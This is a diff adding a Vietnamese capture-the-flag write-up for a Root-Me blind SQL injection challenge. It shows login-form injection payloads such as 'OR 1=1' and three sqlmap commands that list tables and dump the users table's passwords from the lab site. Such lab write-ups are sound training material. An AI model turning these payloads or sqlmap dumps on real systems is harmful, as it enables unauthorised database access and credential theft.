@@ -4,7 +4,7 @@
 * [2. XSS DOM Based - Filters Bypass](#2-xss-dom-based---filters-bypass)
 * [3: SSRF - Server side request fogery](#3-ssrf---server-side-request-fogery)
 * [4. Upload File - Zip](#4-upload-file-zip)
-
+* [5. SQL injection – Blind](5-sql-injection---blind)
 ## 1. Python - Blind SSTI Filters Bypass
 
 ## 
@@ -309,6 +309,50 @@ Ta có được flag:
 >N3v3r_7rU5T_u5Er_1npU7
 
 ## 5. SQL injection – Blind
+
+```
+Retrieve the administrator password.
+
+```
+
+![image](https://user-images.githubusercontent.com/104350480/218262923-6ee81ad9-0251-4b23-b892-834cbe779fe1.png)
+
+
+Như hint từ title thì có vẻ đây là 1 chall về dạng Blind Injection cụ thể là Boolen based. Trước tiên mình sẽ thử trigger lỗi bằng 1 số kí tự đặc biệt, gửi qua burp thấy 2 tham số username và password, thử payload: username=1'abcd&password=1 ta được trả về:
+
+![image](https://user-images.githubusercontent.com/104350480/218263143-ab2bf176-fda0-4695-b25b-7c639eef1c17.png)
+
+Server trả về dbms là sqlite3, ta tiếp tục trigger bằng payload cổ điển: admin'OR 1=1 -- - được trả về: 
+
+![image](https://user-images.githubusercontent.com/104350480/218263214-9dae1c29-12a4-4699-a839-3746b8c9d83b.png)
+
+Có vẻ payload đã được thực thi thành công, giờ thử extract xem có bao nhiêu cột, payload: user1' UNION select null,null,null-- -
+
+![image](https://user-images.githubusercontent.com/104350480/218263330-f07495d1-3e7e-480c-a51a-620ee9772c05.png)
+
+Nhưng có vẻ đã bị filter mất, nên kh thể sử dụng UNION ở đây rồi nên phải dùng cách khác. Ở đây vì là sql blind injection nên ta phải kiểm tra độ dài trước đã, dbms là sqlite3 nên ta có thể dùng **sqlite_master** để xác định độ dài, tên của table. **sqlite_master** là 1 bảng đặc biệt giữ các siêu dữ liệu ề tất cả các bảng, chỉ mục,... tóm cái váy lại là giữ các thông tin quan trọng về các table trong database.
+
+Biết được param để exploit và DMBS ta có thể sử dụng 1 tool khá phổ biến để test lỗ hổng SQLi đó là sqlmap:
+
+> Payload: sqlmap -u http://challenge01.root-me.org/web-serveur/ch10/ -dbms=SQLite --data='username=FUZZ&password=FUZZ' --tables --batch
+
+![image](https://user-images.githubusercontent.com/104350480/218265712-8fc3ed97-b09f-466c-8ae5-0b3c42928379.png)
+
+
+![image](https://user-images.githubusercontent.com/104350480/218265531-240b1e1a-53f8-4845-91e1-ba1e5aea9714.png)
+
+Có được table là database là SQLite_masterdb và tablelaf users, tiếp tục extract tên và số cột:
+
+> Payload: sqlmap --dbms=SQLite -D SQLite_masterdb -T users --columns --data='username=FUZZ&password=FUZZ' -u "challenge01.root-me.org/web-serveur/ch10/" --batch
+
+![image](https://user-images.githubusercontent.com/104350480/218266871-0b8fc508-a7aa-43b8-aa90-379854202200.png)
+ Đã có đủ hết mọi dữ kiện cần thiết, giờ thì dump hết ra là xong:
+ 
+ > Payload: sqlmap.py --dbms=SQLite -D SQLite_masterdb -T users -C "username","password","Year" --dump --data='username=FUZZ&password=FUZZ' -u "challenge01.root-me.org/web-serveur/ch10/"
+
+![image](https://user-images.githubusercontent.com/104350480/218266929-7a48aca2-3ace-4244-9eb7-0a6d0feac4b8.png)
+
+
 
 
 
